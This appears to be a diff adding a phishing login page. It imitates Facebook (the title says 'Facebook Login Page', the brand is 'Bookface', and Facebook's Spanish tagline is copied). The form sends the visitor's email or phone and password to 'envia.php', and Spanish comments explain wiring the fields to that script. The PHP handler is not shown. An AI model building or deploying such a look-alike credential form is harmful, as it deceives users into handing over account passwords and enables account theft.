@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Facebook Login Page</title>
+    <link rel="stylesheet" href="./style.css" />
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>Bookface</h1>
+          <p>Bookface te ayuda a comunicarte y <br> compartir con las personas que forman <br> parte de tu vida.</p>
+          
+        </div>
+        <form action="envia.php" method="post"> <!-- Modifica el atributo "action" para que apunte al archivo PHP -->
+          <input type="email" name="email" placeholder="Correo electrónico o numero teléfonico" required /> <!-- Agrega el atributo "name" para cada campo -->
+          <input type="password" name="password" placeholder="Contraseña" required /> <!-- Agrega el atributo "name" para cada campo -->
+          <div class="link">
+            <button type="submit" class="login">Iniciar sesión</button>
+            <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
+          </div>
+          <hr />
+          <div class="button">
+            <a href="#">Crear nueva cuenta</a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
